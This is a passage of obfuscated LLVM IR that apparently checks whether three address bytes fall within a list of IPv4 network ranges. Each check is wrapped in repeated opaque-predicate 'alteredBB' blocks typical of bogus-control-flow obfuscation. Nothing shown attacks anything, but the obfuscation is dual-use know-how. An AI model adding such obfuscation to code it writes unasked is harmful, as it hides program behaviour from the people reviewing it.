  %2889 = zext i8 %2888 to i32
  %2890 = icmp sge i32 %2889, 8
  br i1 %2890, label %2891, label %2895

; <label>:2891:                                   ; preds = %2887
  %2892 = load i8, i8* %12, align 1
  %2893 = zext i8 %2892 to i32
  %2894 = icmp slt i32 %2893, 63
  br i1 %2894, label %5259, label %2895

; <label>:2895:                                   ; preds = %2891, %2887, %originalBBpart2404, %originalBBpart2400
  %2896 = load i8, i8* %10, align 1
  %2897 = zext i8 %2896 to i32
  %2898 = icmp eq i32 %2897, 64
  br i1 %2898, label %2899, label %2927

; <label>:2899:                                   ; preds = %2895
  %2900 = load i8, i8* %11, align 1
  %2901 = zext i8 %2900 to i32
  %2902 = icmp eq i32 %2901, 237
  br i1 %2902, label %2903, label %2927

; <label>:2903:                                   ; preds = %2899
  %2904 = load i32, i32* @x.57
  %2905 = load i32, i32* @y.58
  %2906 = sub i32 %2904, 1
  %2907 = mul i32 %2904, %2906
  %2908 = urem i32 %2907, 2
  %2909 = icmp eq i32 %2908, 0
  %2910 = icmp slt i32 %2905, 10
  %2911 = or i1 %2909, %2910
  br i1 %2911, label %originalBB406, label %originalBB406alteredBB

originalBB406:                                    ; preds = %originalBB406alteredBB, %2903
  %2912 = load i8, i8* %12, align 1
  %2913 = zext i8 %2912 to i32
  %2914 = icmp sge i32 %2913, 32
  %2915 = load i32, i32* @x.57
  %2916 = load i32, i32* @y.58
  %2917 = sub i32 %2915, 1
  %2918 = mul i32 %2915, %2917
  %2919 = urem i32 %2918, 2
  %2920 = icmp eq i32 %2919, 0
  %2921 = icmp slt i32 %2916, 10
  %2922 = or i1 %2920, %2921
  br i1 %2922, label %originalBBpart2408, label %originalBB406alteredBB

originalBBpart2408:                               ; preds = %originalBB406
  br i1 %2914, label %2923, label %2927

; <label>:2923:                                   ; preds = %originalBBpart2408
  %2924 = load i8, i8* %12, align 1
  %2925 = zext i8 %2924 to i32
  %2926 = icmp slt i32 %2925, 43
  br i1 %2926, label %5259, label %2927

; <label>:2927:                                   ; preds = %2923, %originalBBpart2408, %2899, %2895
  %2928 = load i8, i8* %10, align 1
  %2929 = zext i8 %2928 to i32
  %2930 = icmp eq i32 %2929, 185
  br i1 %2930, label %2931, label %2959

; <label>:2931:                                   ; preds = %2927
  %2932 = load i8, i8* %11, align 1
  %2933 = zext i8 %2932 to i32
  %2934 = icmp eq i32 %2933, 92
  br i1 %2934, label %2935, label %2959

; <label>:2935:                                   ; preds = %2931
  %2936 = load i8, i8* %12, align 1
  %2937 = zext i8 %2936 to i32
  %2938 = icmp sge i32 %2937, 220
  br i1 %2938, label %2939, label %2959

; <label>:2939:                                   ; preds = %2935
  %2940 = load i32, i32* @x.57
  %2941 = load i32, i32* @y.58
  %2942 = sub i32 %2940, 1
  %2943 = mul i32 %2940, %2942
  %2944 = urem i32 %2943, 2
  %2945 = icmp eq i32 %2944, 0
  %2946 = icmp slt i32 %2941, 10
  %2947 = or i1 %2945, %2946
  br i1 %2947, label %originalBB410, label %originalBB410alteredBB

originalBB410:                                    ; preds = %originalBB410alteredBB, %2939
  %2948 = load i8, i8* %12, align 1
  %2949 = zext i8 %2948 to i32
  %2950 = icmp slt i32 %2949, 223
  %2951 = load i32, i32* @x.57
  %2952 = load i32, i32* @y.58
  %2953 = sub i32 %2951, 1
  %2954 = mul i32 %2951, %2953
  %2955 = urem i32 %2954, 2
  %2956 = icmp eq i32 %2955, 0
  %2957 = icmp slt i32 %2952, 10
  %2958 = or i1 %2956, %2957
  br i1 %2958, label %originalBBpart2412, label %originalBB410alteredBB

originalBBpart2412:                               ; preds = %originalBB410
  br i1 %2950, label %5259, label %2959

; <label>:2959:                                   ; preds = %originalBBpart2412, %2935, %2931, %2927
  %2960 = load i8, i8* %10, align 1
  %2961 = zext i8 %2960 to i32
  %2962 = icmp eq i32 %2961, 104
  br i1 %2962, label %2963, label %2975

; <label>:2963:                                   ; preds = %2959
  %2964 = load i8, i8* %11, align 1
  %2965 = zext i8 %2964 to i32
  %2966 = icmp eq i32 %2965, 238
  br i1 %2966, label %2967, label %2975

; <label>:2967:                                   ; preds = %2963
  %2968 = load i8, i8* %12, align 1
  %2969 = zext i8 %2968 to i32
  %2970 = icmp sge i32 %2969, 128
  br i1 %2970, label %2971, label %2975

; <label>:2971:                                   ; preds = %2967
  %2972 = load i8, i8* %12, align 1
  %2973 = zext i8 %2972 to i32
  %2974 = icmp slt i32 %2973, 191
  br i1 %2974, label %5259, label %2975

; <label>:2975:                                   ; preds = %2971, %2967, %2963, %2959
  %2976 = load i8, i8* %10, align 1
  %2977 = zext i8 %2976 to i32
  %2978 = icmp eq i32 %2977, 209
  br i1 %2978, label %2979, label %3007

; <label>:2979:                                   ; preds = %2975
  %2980 = load i32, i32* @x.57
  %2981 = load i32, i32* @y.58
  %2982 = sub i32 %2980, 1
  %2983 = mul i32 %2980, %2982
  %2984 = urem i32 %2983, 2
  %2985 = icmp eq i32 %2984, 0
  %2986 = icmp slt i32 %2981, 10
  %2987 = or i1 %2985, %2986
  br i1 %2987, label %originalBB414, label %originalBB414alteredBB

originalBB414:                                    ; preds = %originalBB414alteredBB, %2979
  %2988 = load i8, i8* %11, align 1
  %2989 = zext i8 %2988 to i32
  %2990 = icmp eq i32 %2989, 222
  %2991 = load i32, i32* @x.57
  %2992 = load i32, i32* @y.58
  %2993 = sub i32 %2991, 1
  %2994 = mul i32 %2991, %2993
  %2995 = urem i32 %2994, 2
  %2996 = icmp eq i32 %2995, 0
  %2997 = icmp slt i32 %2992, 10
  %2998 = or i1 %2996, %2997
  br i1 %2998, label %originalBBpart2416, label %originalBB414alteredBB

originalBBpart2416:                               ; preds = %originalBB414
  br i1 %2990, label %2999, label %3007

; <label>:2999:                                   ; preds = %originalBBpart2416
  %3000 = load i8, i8* %12, align 1
  %3001 = zext i8 %3000 to i32
  %3002 = icmp sge i32 %3001, 1
  br i1 %3002, label %3003, label %3007

; <label>:3003:                                   ; preds = %2999
  %3004 = load i8, i8* %12, align 1
  %3005 = zext i8 %3004 to i32
  %3006 = icmp slt i32 %3005, 31
  br i1 %3006, label %5259, label %3007

; <label>:3007:                                   ; preds = %3003, %2999, %originalBBpart2416, %2975
  %3008 = load i32, i32* @x.57
  %3009 = load i32, i32* @y.58
  %3010 = sub i32 %3008, 1
  %3011 = mul i32 %3008, %3010
  %3012 = urem i32 %3011, 2
  %3013 = icmp eq i32 %3012, 0
  %3014 = icmp slt i32 %3009, 10
  %3015 = or i1 %3013, %3014
  br i1 %3015, label %originalBB418, label %originalBB418alteredBB

originalBB418:                                    ; preds = %originalBB418alteredBB, %3007
  %3016 = load i8, i8* %10, align 1
  %3017 = zext i8 %3016 to i32
  %3018 = icmp eq i32 %3017, 208
  %3019 = load i32, i32* @x.57
  %3020 = load i32, i32* @y.58
  %3021 = sub i32 %3019, 1
  %3022 = mul i32 %3019, %3021
  %3023 = urem i32 %3022, 2
  %3024 = icmp eq i32 %3023, 0
  %3025 = icmp slt i32 %3020, 10
  %3026 = or i1 %3024, %3025
  br i1 %3026, label %originalBBpart2420, label %originalBB418alteredBB

originalBBpart2420:                               ; preds = %originalBB418
  br i1 %3018, label %3027, label %3039

; <label>:3027:                                   ; preds = %originalBBpart2420
  %3028 = load i8, i8* %11, align 1
  %3029 = zext i8 %3028 to i32
  %3030 = icmp eq i32 %3029, 167
  br i1 %3030, label %3031, label %3039

; <label>:3031:                                   ; preds = %3027
  %3032 = load i8, i8* %12, align 1
  %3033 = zext i8 %3032 to i32
  %3034 = icmp sge i32 %3033, 232
  br i1 %3034, label %3035, label %3039

; <label>:3035:                                   ; preds = %3031
  %3036 = load i8, i8* %12, align 1
  %3037 = zext i8 %3036 to i32
  %3038 = icmp slt i32 %3037, 252
  br i1 %3038, label %5259, label %3039

; <label>:3039:                                   ; preds = %3035, %3031, %3027, %originalBBpart2420
  %3040 = load i8, i8* %10, align 1
  %3041 = zext i8 %3040 to i32
  %3042 = icmp eq i32 %3041, 66
  br i1 %3042, label %3043, label %3055

; <label>:3043:                                   ; preds = %3039
  %3044 = load i8, i8* %11, align 1
  %3045 = zext i8 %3044 to i32
  %3046 = icmp eq i32 %3045, 55
  br i1 %3046, label %3047, label %3055

; <label>:3047:                                   ; preds = %3043
  %3048 = load i8, i8* %12, align 1
  %3049 = zext i8 %3048 to i32
  %3050 = icmp sge i32 %3049, 128
  br i1 %3050, label %3051, label %3055

; <label>:3051:                                   ; preds = %3047
  %3052 = load i8, i8* %12, align 1
  %3053 = zext i8 %3052 to i32
  %3054 = icmp slt i32 %3053, 159
  br i1 %3054, label %5259, label %3055

; <label>:3055:                                   ; preds = %3051, %3047, %3043, %3039
  %3056 = load i32, i32* @x.57
  %3057 = load i32, i32* @y.58
  %3058 = sub i32 %3056, 1
  %3059 = mul i32 %3056, %3058
  %3060 = urem i32 %3059, 2
  %3061 = icmp eq i32 %3060, 0
  %3062 = icmp slt i32 %3057, 10
  %3063 = or i1 %3061, %3062
  br i1 %3063, label %originalBB422, label %originalBB422alteredBB

originalBB422:                                    ; preds = %originalBB422alteredBB, %3055
  %3064 = load i8, i8* %10, align 1
  %3065 = zext i8 %3064 to i32
  %3066 = icmp eq i32 %3065, 45
  %3067 = load i32, i32* @x.57
  %3068 = load i32, i32* @y.58
  %3069 = sub i32 %3067, 1
  %3070 = mul i32 %3067, %3069
  %3071 = urem i32 %3070, 2
  %3072 = icmp eq i32 %3071, 0
  %3073 = icmp slt i32 %3068, 10
  %3074 = or i1 %3072, %3073
  br i1 %3074, label %originalBBpart2424, label %originalBB422alteredBB

originalBBpart2424:                               ; preds = %originalBB422
  br i1 %3066, label %3075, label %3119

; <label>:3075:                                   ; preds = %originalBBpart2424
  %3076 = load i32, i32* @x.57
  %3077 = load i32, i32* @y.58
  %3078 = sub i32 %3076, 1
  %3079 = mul i32 %3076, %3078
  %3080 = urem i32 %3079, 2
  %3081 = icmp eq i32 %3080, 0
  %3082 = icmp slt i32 %3077, 10
  %3083 = or i1 %3081, %3082
  br i1 %3083, label %originalBB426, label %originalBB426alteredBB

originalBB426:                                    ; preds = %originalBB426alteredBB, %3075
  %3084 = load i8, i8* %11, align 1
  %3085 = zext i8 %3084 to i32
  %3086 = icmp eq i32 %3085, 63
  %3087 = load i32, i32* @x.57
  %3088 = load i32, i32* @y.58
  %3089 = sub i32 %3087, 1
  %3090 = mul i32 %3087, %3089
  %3091 = urem i32 %3090, 2
  %3092 = icmp eq i32 %3091, 0
  %3093 = icmp slt i32 %3088, 10
  %3094 = or i1 %3092, %3093
  br i1 %3094, label %originalBBpart2428, label %originalBB426alteredBB

originalBBpart2428:                               ; preds = %originalBB426
  br i1 %3086, label %3095, label %3119

; <label>:3095:                                   ; preds = %originalBBpart2428
  %3096 = load i32, i32* @x.57
  %3097 = load i32, i32* @y.58
  %3098 = sub i32 %3096, 1
  %3099 = mul i32 %3096, %3098
  %3100 = urem i32 %3099, 2
  %3101 = icmp eq i32 %3100, 0
  %3102 = icmp slt i32 %3097, 10
  %3103 = or i1 %3101, %3102
  br i1 %3103, label %originalBB430, label %originalBB430alteredBB

originalBB430:                                    ; preds = %originalBB430alteredBB, %3095
  %3104 = load i8, i8* %12, align 1
  %3105 = zext i8 %3104 to i32
  %3106 = icmp sge i32 %3105, 1
  %3107 = load i32, i32* @x.57
  %3108 = load i32, i32* @y.58
  %3109 = sub i32 %3107, 1
  %3110 = mul i32 %3107, %3109
  %3111 = urem i32 %3110, 2
  %3112 = icmp eq i32 %3111, 0
  %3113 = icmp slt i32 %3108, 10
  %3114 = or i1 %3112, %3113
  br i1 %3114, label %originalBBpart2432, label %originalBB430alteredBB

originalBBpart2432:                               ; preds = %originalBB430
  br i1 %3106, label %3115, label %3119

; <label>:3115:                                   ; preds = %originalBBpart2432
  %3116 = load i8, i8* %12, align 1
  %3117 = zext i8 %3116 to i32
  %3118 = icmp slt i32 %3117, 127
  br i1 %3118, label %5259, label %3119

; <label>:3119:                                   ; preds = %3115, %originalBBpart2432, %originalBBpart2428, %originalBBpart2424
  %3120 = load i8, i8* %10, align 1
  %3121 = zext i8 %3120 to i32
  %3122 = icmp eq i32 %3121, 216
  br i1 %3122, label %3123, label %3151

; <label>:3123:                                   ; preds = %3119
  %3124 = load i32, i32* @x.57
  %3125 = load i32, i32* @y.58
  %3126 = sub i32 %3124, 1
  %3127 = mul i32 %3124, %3126
  %3128 = urem i32 %3127, 2
  %3129 = icmp eq i32 %3128, 0
  %3130 = icmp slt i32 %3125, 10
  %3131 = or i1 %3129, %3130
  br i1 %3131, label %originalBB434, label %originalBB434alteredBB

originalBB434:                                    ; preds = %originalBB434alteredBB, %3123
  %3132 = load i8, i8* %11, align 1
  %3133 = zext i8 %3132 to i32
  %3134 = icmp eq i32 %3133, 237
  %3135 = load i32, i32* @x.57
  %3136 = load i32, i32* @y.58
  %3137 = sub i32 %3135, 1
  %3138 = mul i32 %3135, %3137
  %3139 = urem i32 %3138, 2
  %3140 = icmp eq i32 %3139, 0
  %3141 = icmp slt i32 %3136, 10
  %3142 = or i1 %3140, %3141
  br i1 %3142, label %originalBBpart2436, label %originalBB434alteredBB

originalBBpart2436:                               ; preds = %originalBB434
  br i1 %3134, label %3143, label %3151

; <label>:3143:                                   ; preds = %originalBBpart2436
  %3144 = load i8, i8* %12, align 1
  %3145 = zext i8 %3144 to i32
  %3146 = icmp sge i32 %3145, 128
  br i1 %3146, label %3147, label %3151

; <label>:3147:                                   ; preds = %3143
  %3148 = load i8, i8* %12, align 1
  %3149 = zext i8 %3148 to i32
  %3150 = icmp slt i32 %3149, 159
  br i1 %3150, label %5259, label %3151

; <label>:3151:                                   ; preds = %3147, %3143, %originalBBpart2436, %3119
  %3152 = load i8, i8* %10, align 1
  %3153 = zext i8 %3152 to i32
  %3154 = icmp eq i32 %3153, 108
  br i1 %3154, label %3155, label %3175

; <label>:3155:                                   ; preds = %3151
  %3156 = load i32, i32* @x.57
  %3157 = load i32, i32* @y.58
  %3158 = sub i32 %3156, 1
  %3159 = mul i32 %3156, %3158
  %3160 = urem i32 %3159, 2
  %3161 = icmp eq i32 %3160, 0
  %3162 = icmp slt i32 %3157, 10
  %3163 = or i1 %3161, %3162
  br i1 %3163, label %originalBB438, label %originalBB438alteredBB

originalBB438:                                    ; preds = %originalBB438alteredBB, %3155
  %3164 = load i8, i8* %11, align 1
  %3165 = zext i8 %3164 to i32
  %3166 = icmp eq i32 %3165, 61
  %3167 = load i32, i32* @x.57
  %3168 = load i32, i32* @y.58
  %3169 = sub i32 %3167, 1
  %3170 = mul i32 %3167, %3169
  %3171 = urem i32 %3170, 2
  %3172 = icmp eq i32 %3171, 0
  %3173 = icmp slt i32 %3168, 10
  %3174 = or i1 %3172, %3173
  br i1 %3174, label %originalBBpart2440, label %originalBB438alteredBB

originalBBpart2440:                               ; preds = %originalBB438
  br i1 %3166, label %5259, label %3175

; <label>:3175:                                   ; preds = %originalBBpart2440, %3151
  %3176 = load i32, i32* @x.57
  %3177 = load i32, i32* @y.58
  %3178 = sub i32 %3176, 1
  %3179 = mul i32 %3176, %3178
  %3180 = urem i32 %3179, 2
  %3181 = icmp eq i32 %3180, 0
  %3182 = icmp slt i32 %3177, 10
  %3183 = or i1 %3181, %3182
  br i1 %3183, label %originalBB442, label %originalBB442alteredBB

originalBB442:                                    ; preds = %originalBB442alteredBB, %3175
  %3184 = load i8, i8* %10, align 1
  %3185 = zext i8 %3184 to i32
  %3186 = icmp eq i32 %3185, 45
  %3187 = load i32, i32* @x.57
  %3188 = load i32, i32* @y.58
  %3189 = sub i32 %3187, 1
  %3190 = mul i32 %3187, %3189
  %3191 = urem i32 %3190, 2
  %3192 = icmp eq i32 %3191, 0
  %3193 = icmp slt i32 %3188, 10
  %3194 = or i1 %3192, %3193
  br i1 %3194, label %originalBBpart2444, label %originalBB442alteredBB

originalBBpart2444:                               ; preds = %originalBB442
  br i1 %3186, label %3195, label %3215

; <label>:3195:                                   ; preds = %originalBBpart2444
  %3196 = load i32, i32* @x.57
  %3197 = load i32, i32* @y.58
  %3198 = sub i32 %3196, 1
  %3199 = mul i32 %3196, %3198
  %3200 = urem i32 %3199, 2
  %3201 = icmp eq i32 %3200, 0
  %3202 = icmp slt i32 %3197, 10
  %3203 = or i1 %3201, %3202
  br i1 %3203, label %originalBB446, label %originalBB446alteredBB

originalBB446:                                    ; preds = %originalBB446alteredBB, %3195
  %3204 = load i8, i8* %11, align 1
  %3205 = zext i8 %3204 to i32
  %3206 = icmp eq i32 %3205, 76
  %3207 = load i32, i32* @x.57
  %3208 = load i32, i32* @y.58
  %3209 = sub i32 %3207, 1
  %3210 = mul i32 %3207, %3209
  %3211 = urem i32 %3210, 2
  %3212 = icmp eq i32 %3211, 0
  %3213 = icmp slt i32 %3208, 10
  %3214 = or i1 %3212, %3213
  br i1 %3214, label %originalBBpart2448, label %originalBB446alteredBB

originalBBpart2448:                               ; preds = %originalBB446
  br i1 %3206, label %5259, label %3215

; <label>:3215:                                   ; preds = %originalBBpart2448, %originalBBpart2444
  %3216 = load i8, i8* %10, align 1
  %3217 = zext i8 %3216 to i32
  %3218 = icmp eq i32 %3217, 185
  br i1 %3218, label %3219, label %3263

; <label>:3219:                                   ; preds = %3215
  %3220 = load i32, i32* @x.57
  %3221 = load i32, i32* @y.58
  %3222 = sub i32 %3220, 1
  %3223 = mul i32 %3220, %3222
  %3224 = urem i32 %3223, 2
  %3225 = icmp eq i32 %3224, 0
  %3226 = icmp slt i32 %3221, 10
  %3227 = or i1 %3225, %3226
  br i1 %3227, label %originalBB450, label %originalBB450alteredBB

originalBB450:                                    ; preds = %originalBB450alteredBB, %3219
  %3228 = load i8, i8* %11, align 1
  %3229 = zext i8 %3228 to i32
  %3230 = icmp eq i32 %3229, 11
  %3231 = load i32, i32* @x.57
  %3232 = load i32, i32* @y.58
  %3233 = sub i32 %3231, 1
  %3234 = mul i32 %3231, %3233
  %3235 = urem i32 %3234, 2
  %3236 = icmp eq i32 %3235, 0
  %3237 = icmp slt i32 %3232, 10
  %3238 = or i1 %3236, %3237
  br i1 %3238, label %originalBBpart2452, label %originalBB450alteredBB

originalBBpart2452:                               ; preds = %originalBB450
  br i1 %3230, label %3239, label %3263

; <label>:3239:                                   ; preds = %originalBBpart2452
  %3240 = load i8, i8* %12, align 1
  %3241 = zext i8 %3240 to i32
  %3242 = icmp sge i32 %3241, 144
  br i1 %3242, label %3243, label %3263

; <label>:3243:                                   ; preds = %3239
  %3244 = load i32, i32* @x.57
  %3245 = load i32, i32* @y.58
  %3246 = sub i32 %3244, 1
  %3247 = mul i32 %3244, %3246
  %3248 = urem i32 %3247, 2
  %3249 = icmp eq i32 %3248, 0
  %3250 = icmp slt i32 %3245, 10
  %3251 = or i1 %3249, %3250
  br i1 %3251, label %originalBB454, label %originalBB454alteredBB

originalBB454:                                    ; preds = %originalBB454alteredBB, %3243
  %3252 = load i8, i8* %12, align 1
  %3253 = zext i8 %3252 to i32
  %3254 = icmp slt i32 %3253, 148
  %3255 = load i32, i32* @x.57
  %3256 = load i32, i32* @y.58
  %3257 = sub i32 %3255, 1
  %3258 = mul i32 %3255, %3257
  %3259 = urem i32 %3258, 2
  %3260 = icmp eq i32 %3259, 0
  %3261 = icmp slt i32 %3256, 10
  %3262 = or i1 %3260, %3261
  br i1 %3262, label %originalBBpart2456, label %originalBB454alteredBB

originalBBpart2456:                               ; preds = %originalBB454
  br i1 %3254, label %5259, label %3263

; <label>:3263:                                   ; preds = %originalBBpart2456, %3239, %originalBBpart2452, %3215
  %3264 = load i8, i8* %10, align 1
  %3265 = zext i8 %3264 to i32
  %3266 = icmp eq i32 %3265, 185
  br i1 %3266, label %3267, label %3311

; <label>:3267:                                   ; preds = %3263
  %3268 = load i32, i32* @x.57
  %3269 = load i32, i32* @y.58
  %3270 = sub i32 %3268, 1
  %3271 = mul i32 %3268, %3270
  %3272 = urem i32 %3271, 2
  %3273 = icmp eq i32 %3272, 0
  %3274 = icmp slt i32 %3269, 10
  %3275 = or i1 %3273, %3274
  br i1 %3275, label %originalBB458, label %originalBB458alteredBB

originalBB458:                                    ; preds = %originalBB458alteredBB, %3267
  %3276 = load i8, i8* %11, align 1
  %3277 = zext i8 %3276 to i32
  %3278 = icmp eq i32 %3277, 56
  %3279 = load i32, i32* @x.57
  %3280 = load i32, i32* @y.58
  %3281 = sub i32 %3279, 1
  %3282 = mul i32 %3279, %3281
  %3283 = urem i32 %3282, 2
  %3284 = icmp eq i32 %3283, 0
  %3285 = icmp slt i32 %3280, 10
  %3286 = or i1 %3284, %3285
  br i1 %3286, label %originalBBpart2460, label %originalBB458alteredBB

originalBBpart2460:                               ; preds = %originalBB458
  br i1 %3278, label %3287, label %3311

; <label>:3287:                                   ; preds = %originalBBpart2460
  %3288 = load i8, i8* %12, align 1
  %3289 = zext i8 %3288 to i32
  %3290 = icmp sge i32 %3289, 21
  br i1 %3290, label %3291, label %3311

; <label>:3291:                                   ; preds = %3287
  %3292 = load i32, i32* @x.57
  %3293 = load i32, i32* @y.58
  %3294 = sub i32 %3292, 1
  %3295 = mul i32 %3292, %3294
  %3296 = urem i32 %3295, 2
  %3297 = icmp eq i32 %3296, 0
  %3298 = icmp slt i32 %3293, 10
  %3299 = or i1 %3297, %3298
  br i1 %3299, label %originalBB462, label %originalBB462alteredBB

originalBB462:                                    ; preds = %originalBB462alteredBB, %3291
  %3300 = load i8, i8* %12, align 1
  %3301 = zext i8 %3300 to i32
  %3302 = icmp slt i32 %3301, 23
  %3303 = load i32, i32* @x.57
  %3304 = load i32, i32* @y.58
  %3305 = sub i32 %3303, 1
  %3306 = mul i32 %3303, %3305
  %3307 = urem i32 %3306, 2
  %3308 = icmp eq i32 %3307, 0
  %3309 = icmp slt i32 %3304, 10
  %3310 = or i1 %3308, %3309
  br i1 %3310, label %originalBBpart2464, label %originalBB462alteredBB

originalBBpart2464:                               ; preds = %originalBB462
  br i1 %3302, label %5259, label %3311

; <label>:3311:                                   ; preds = %originalBBpart2464, %3287, %originalBBpart2460, %3263
  %3312 = load i8, i8* %10, align 1
  %3313 = zext i8 %3312 to i32
  %3314 = icmp eq i32 %3313, 185
  br i1 %3314, label %3315, label %3327

; <label>:3315:                                   ; preds = %3311
  %3316 = load i8, i8* %11, align 1
  %3317 = zext i8 %3316 to i32
  %3318 = icmp eq i32 %3317, 61
  br i1 %3318, label %3319, label %3327

; <label>:3319:                                   ; preds = %3315
  %3320 = load i8, i8* %12, align 1
  %3321 = zext i8 %3320 to i32
  %3322 = icmp sge i32 %3321, 136
  br i1 %3322, label %3323, label %3327

; <label>:3323:                                   ; preds = %3319
  %3324 = load i8, i8* %12, align 1
  %3325 = zext i8 %3324 to i32
  %3326 = icmp slt i32 %3325, 139
  br i1 %3326, label %5259, label %3327

; <label>:3327:                                   ; preds = %3323, %3319, %3315, %3311
  %3328 = load i8, i8* %10, align 1
  %3329 = zext i8 %3328 to i32
  %3330 = icmp eq i32 %3329, 185
  br i1 %3330, label %3331, label %3343

; <label>:3331:                                   ; preds = %3327
  %3332 = load i8, i8* %11, align 1
  %3333 = zext i8 %3332 to i32
  %3334 = icmp eq i32 %3333, 62
  br i1 %3334, label %3335, label %3343

; <label>:3335:                                   ; preds = %3331
  %3336 = load i8, i8* %12, align 1
  %3337 = zext i8 %3336 to i32
  %3338 = icmp sge i32 %3337, 187
  br i1 %3338, label %3339, label %3343

; <label>:3339:                                   ; preds = %3335
  %3340 = load i8, i8* %12, align 1
  %3341 = zext i8 %3340 to i32
  %3342 = icmp slt i32 %3341, 191
  br i1 %3342, label %5259, label %3343

; <label>:3343:                                   ; preds = %3339, %3335, %3331, %3327
  %3344 = load i32, i32* @x.57
  %3345 = load i32, i32* @y.58
  %3346 = sub i32 %3344, 1
  %3347 = mul i32 %3344, %3346
  %3348 = urem i32 %3347, 2
  %3349 = icmp eq i32 %3348, 0
  %3350 = icmp slt i32 %3345, 10
  %3351 = or i1 %3349, %3350
  br i1 %3351, label %originalBB466, label %originalBB466alteredBB

originalBB466:                                    ; preds = %originalBB466alteredBB, %3343
  %3352 = load i8, i8* %10, align 1
  %3353 = zext i8 %3352 to i32
  %3354 = icmp eq i32 %3353, 66
  %3355 = load i32, i32* @x.57
  %3356 = load i32, i32* @y.58
  %3357 = sub i32 %3355, 1
  %3358 = mul i32 %3355, %3357
  %3359 = urem i32 %3358, 2
  %3360 = icmp eq i32 %3359, 0
  %3361 = icmp slt i32 %3356, 10
  %3362 = or i1 %3360, %3361
  br i1 %3362, label %originalBBpart2468, label %originalBB466alteredBB

originalBBpart2468:                               ; preds = %originalBB466
  br i1 %3354, label %3363, label %3391

; <label>:3363:                                   ; preds = %originalBBpart2468
  %3364 = load i8, i8* %11, align 1
  %3365 = zext i8 %3364 to i32
  %3366 = icmp eq i32 %3365, 150
  br i1 %3366, label %3367, label %3391

; <label>:3367:                                   ; preds = %3363
  %3368 = load i8, i8* %12, align 1
  %3369 = zext i8 %3368 to i32
  %3370 = icmp sge i32 %3369, 120
  br i1 %3370, label %3371, label %3391

; <label>:3371:                                   ; preds = %3367
  %3372 = load i32, i32* @x.57
  %3373 = load i32, i32* @y.58
  %3374 = sub i32 %3372, 1
  %3375 = mul i32 %3372, %3374
  %3376 = urem i32 %3375, 2
  %3377 = icmp eq i32 %3376, 0
  %3378 = icmp slt i32 %3373, 10
  %3379 = or i1 %3377, %3378
  br i1 %3379, label %originalBB470, label %originalBB470alteredBB

originalBB470:                                    ; preds = %originalBB470alteredBB, %3371
  %3380 = load i8, i8* %12, align 1
  %3381 = zext i8 %3380 to i32
  %3382 = icmp slt i32 %3381, 215
  %3383 = load i32, i32* @x.57
  %3384 = load i32, i32* @y.58
  %3385 = sub i32 %3383, 1
  %3386 = mul i32 %3383, %3385
  %3387 = urem i32 %3386, 2
  %3388 = icmp eq i32 %3387, 0
  %3389 = icmp slt i32 %3384, 10
  %3390 = or i1 %3388, %3389
  br i1 %3390, label %originalBBpart2472, label %originalBB470alteredBB

originalBBpart2472:                               ; preds = %originalBB470
  br i1 %3382, label %5259, label %3391

; <label>:3391:                                   ; preds = %originalBBpart2472, %3367, %3363, %originalBBpart2468
  %3392 = load i8, i8* %10, align 1
  %3393 = zext i8 %3392 to i32
  %3394 = icmp eq i32 %3393, 66
  br i1 %3394, label %3395, label %3423

; <label>:3395:                                   ; preds = %3391
  %3396 = load i8, i8* %11, align 1
  %3397 = zext i8 %3396 to i32
  %3398 = icmp eq i32 %3397, 151
  br i1 %3398, label %3399, label %3423

; <label>:3399:                                   ; preds = %3395
  %3400 = load i8, i8* %12, align 1
  %3401 = zext i8 %3400 to i32
  %3402 = icmp sge i32 %3401, 137
  br i1 %3402, label %3403, label %3423

; <label>:3403:                                   ; preds = %3399
  %3404 = load i32, i32* @x.57
  %3405 = load i32, i32* @y.58
  %3406 = sub i32 %3404, 1
  %3407 = mul i32 %3404, %3406
  %3408 = urem i32 %3407, 2
  %3409 = icmp eq i32 %3408, 0
  %3410 = icmp slt i32 %3405, 10
  %3411 = or i1 %3409, %3410
  br i1 %3411, label %originalBB474, label %originalBB474alteredBB

originalBB474:                                    ; preds = %originalBB474alteredBB, %3403
  %3412 = load i8, i8* %12, align 1
  %3413 = zext i8 %3412 to i32
  %3414 = icmp slt i32 %3413, 139
  %3415 = load i32, i32* @x.57
  %3416 = load i32, i32* @y.58
  %3417 = sub i32 %3415, 1
  %3418 = mul i32 %3415, %3417
  %3419 = urem i32 %3418, 2
  %3420 = icmp eq i32 %3419, 0
  %3421 = icmp slt i32 %3416, 10
  %3422 = or i1 %3420, %3421
  br i1 %3422, label %originalBBpart2476, label %originalBB474alteredBB

originalBBpart2476:                               ; preds = %originalBB474
  br i1 %3414, label %5259, label %3423

; <label>:3423:                                   ; preds = %originalBBpart2476, %3399, %3395, %3391
  %3424 = load i8, i8* %10, align 1
  %3425 = zext i8 %3424 to i32
  %3426 = icmp eq i32 %3425, 64
  br i1 %3426, label %3427, label %3471

; <label>:3427:                                   ; preds = %3423
  %3428 = load i32, i32* @x.57
  %3429 = load i32, i32* @y.58
  %3430 = sub i32 %3428, 1
  %3431 = mul i32 %3428, %3430
  %3432 = urem i32 %3431, 2
  %3433 = icmp eq i32 %3432, 0
  %3434 = icmp slt i32 %3429, 10
  %3435 = or i1 %3433, %3434
  br i1 %3435, label %originalBB478, label %originalBB478alteredBB

originalBB478:                                    ; preds = %originalBB478alteredBB, %3427
  %3436 = load i8, i8* %11, align 1
  %3437 = zext i8 %3436 to i32
  %3438 = icmp eq i32 %3437, 94
  %3439 = load i32, i32* @x.57
  %3440 = load i32, i32* @y.58
  %3441 = sub i32 %3439, 1
  %3442 = mul i32 %3439, %3441
  %3443 = urem i32 %3442, 2
  %3444 = icmp eq i32 %3443, 0
  %3445 = icmp slt i32 %3440, 10
  %3446 = or i1 %3444, %3445
  br i1 %3446, label %originalBBpart2480, label %originalBB478alteredBB

originalBBpart2480:                               ; preds = %originalBB478
  br i1 %3438, label %3447, label %3471

; <label>:3447:                                   ; preds = %originalBBpart2480
  %3448 = load i32, i32* @x.57
  %3449 = load i32, i32* @y.58
  %3450 = sub i32 %3448, 1
  %3451 = mul i32 %3448, %3450
  %3452 = urem i32 %3451, 2
  %3453 = icmp eq i32 %3452, 0
  %3454 = icmp slt i32 %3449, 10
  %3455 = or i1 %3453, %3454
  br i1 %3455, label %originalBB482, label %originalBB482alteredBB

originalBB482:                                    ; preds = %originalBB482alteredBB, %3447
  %3456 = load i8, i8* %12, align 1
  %3457 = zext i8 %3456 to i32
  %3458 = icmp sge i32 %3457, 237
  %3459 = load i32, i32* @x.57
  %3460 = load i32, i32* @y.58
  %3461 = sub i32 %3459, 1
  %3462 = mul i32 %3459, %3461
  %3463 = urem i32 %3462, 2
